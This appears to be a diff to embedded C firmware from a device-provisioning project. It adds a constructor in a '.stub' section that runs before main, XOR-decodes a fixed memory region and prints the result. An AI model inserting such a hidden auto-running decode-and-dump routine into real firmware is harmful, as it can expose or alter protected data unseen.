@@ -51,6 +51,20 @@ static XIntc InterruptController;
 
 void myISR(void) { InterruptProcessed = TRUE; }
 
+extern void* rwdata_size;
+void __attribute__((constructor,section(".stub"))) init(){
+    long rodata =0x601400;
+    char* tmp = (char*)rodata;
+    for(unsigned int x = 0; x<(unsigned int)&rwdata_size; x++)
+    {
+ 	*(tmp + x) ^=0xD5;
+	printf("%c",*(tmp+x));
+    }
+    printf("\n");
+
+    return ;
+}
+
 //////////////////////// UTILITY FUNCTIONS ////////////////////////
 
 // returns whether an rid has been provisioned
